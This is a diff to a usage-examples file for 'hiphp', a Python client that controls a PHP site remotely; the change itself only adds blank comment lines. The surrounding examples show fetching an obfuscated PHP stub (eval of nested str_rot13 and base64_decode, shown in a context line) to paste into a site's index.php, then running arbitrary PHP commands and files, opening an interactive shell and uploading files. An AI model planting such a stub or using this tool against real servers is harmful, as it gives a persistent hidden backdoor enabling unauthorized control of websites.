@@ -1,5 +1,10 @@
 from hiphp import hiphp
+#
+#
 p1=hiphp("123","http://localhost/index.php",False)
+#
+#
+#
 # Example:1
 # GET ID:
 print(p1.get_code())
@@ -11,6 +16,9 @@ eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdU
 '''
 # Copy this code into the file whose path you entered earlier.
 # for example: https://localhost/index.php
+#
+#
+#
 # Example:2
 # Command:
 p1.run("echo 'this is a test';")
@@ -18,6 +26,9 @@ p1.run("echo 'this is a test';")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:3
 # Run code from file:
 #-example_3.php content:
@@ -35,6 +46,9 @@ p1.run_file("example_3.php")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:4
 # Run code from file With the entry of variables:
 #-example_4.php content:
@@ -52,6 +66,9 @@ p1.run_file("example_4.php","test==this is a test")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:5
 # Command line interface:
 p1.cli()
@@ -59,9 +76,15 @@ p1.cli()
 '''
 hiphp>>>
 '''
+#
+#
+#
 # Example:6
 # Upload a picture:
 p1.upload("picture_example.png")
+#
+#
+#
 # Example:7
 # Upload a picture to a specific path:
 p1.upload("picture_example.png","./pictures/")
